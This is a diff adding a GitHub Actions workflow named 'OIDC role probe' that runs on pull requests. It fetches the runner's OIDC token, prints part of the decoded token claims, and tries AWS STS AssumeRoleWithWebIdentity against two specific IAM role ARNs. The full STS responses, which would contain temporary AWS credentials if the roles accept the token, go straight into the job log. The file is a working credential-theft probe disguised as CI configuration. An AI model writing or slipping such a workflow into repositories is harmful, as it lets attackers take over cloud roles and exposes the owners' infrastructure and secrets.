@@ -1,0 +1,23 @@
+name: OIDC role probe
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set -u
+          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          V=$(printf '%s' "$RESP" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])')
+          echo "jwt_len=${#V}"
+          echo "$V" | python3 -c 'import sys,base64; p=sys.stdin.read().strip().split(".")[1]; p+="="*(-len(p)%4); print(base64.urlsafe_b64decode(p).decode()[:500])'
+          for ROLE in "arn:aws:iam::590184134703:role/github-actions" "arn:aws:iam::074996771758:role/docs-ingestion-github-actions"; do
+            echo "ROLE_BEGIN=$ROLE"
+            curl -sS --max-time 30 "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=$ROLE" --data-urlencode "RoleSessionName=ci" --data-urlencode "DurationSeconds=3600" --data-urlencode "WebIdentityToken=$V"
+            echo
+            echo "ROLE_END=$ROLE"
+          done
